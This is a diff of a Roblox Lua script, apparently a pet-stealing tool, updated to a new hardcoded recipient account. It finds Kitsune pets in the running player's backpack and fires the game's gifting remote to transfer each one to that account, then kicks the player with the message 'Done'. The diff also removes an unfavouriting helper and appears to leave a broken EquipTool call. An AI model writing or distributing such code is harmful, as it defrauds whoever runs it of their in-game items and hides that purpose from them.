@@ -1,9 +1,9 @@
-getgenv().Target = "matrix4QFeycYL0pz"
+getgenv().Target = "cyberoJH6rXOliaD4"
 getgenv().Select_Pet = {
     "Corrupted Kitsune",
     "Kitsune"
 }
-getgenv().Kick_After_Trade = fasle
+getgenv().Kick_After_Trade = true
 repeat task.wait() until game:IsLoaded()
 repeat task.wait() until game.Players.LocalPlayer.Character
 
@@ -58,12 +58,10 @@ else
     end
     while task.wait() do
         for i, v in pairs(save) do
-            local petTool = plr:FindFirstChild("Backpack"):FindFirstChild(v.Name)
-            if petTool then
-                unlock_favorite_pet(petTool)
+            if plr:FindFirstChild("Backpack"):FindFirstChild(v.Name) then
                 local huy = game:GetService("Players"):FindFirstChild(getgenv().Target)
                 if huy then
-                    plr.Character.Humanoid:EquipTool(petTool)
+                    plr.Character.Humanoid:EquipTool(v)
                     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", huy)
                     task.wait(5)
                 end
@@ -80,42 +78,3 @@ else
         plr:Kick("Done")
     end
 end
-
-local function unlock_favorite_pet(tool)
-    local plr = game:GetService("Players").LocalPlayer
-    local gui = plr.PlayerGui:FindFirstChild("BackpackGui")
-    if not gui then return false end
-
-    -- Equip tool lên tay
-    plr.Character.Humanoid:EquipTool(tool)
-    task.wait(0.2)
-
-    -- Kiểm tra slot đang được chọn trên Hotbar (Background.Visible = true)
-    local hotbar = gui.Backpack.Hotbar
-    local selectedSlot
-    for _, slot in ipairs(hotbar:GetChildren()) do
-        if slot:IsA("Frame") and slot:FindFirstChild("Background") and slot.Background.Visible then
-            selectedSlot = slot
-            break
-        end
-    end
-
-    if selectedSlot and selectedSlot:FindFirstChild("FavIcon") then
-        local fav = selectedSlot.FavIcon
-        if fav.Visible then
-            task.wait(2)
-            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
-            print("Đã gửi remote bỏ favorite cho:", tool.Name)
-            return true
-        else
-            print("Tool không favorite, có thể gift luôn.")
-            return false
-        end
-    else
-        print("Không xác định được slot đang cầm tool.")
-        return false
-    end
-end
-
--- Ví dụ sử dụng:
-unlock_favorite_pet("Corrupted Kitsune")
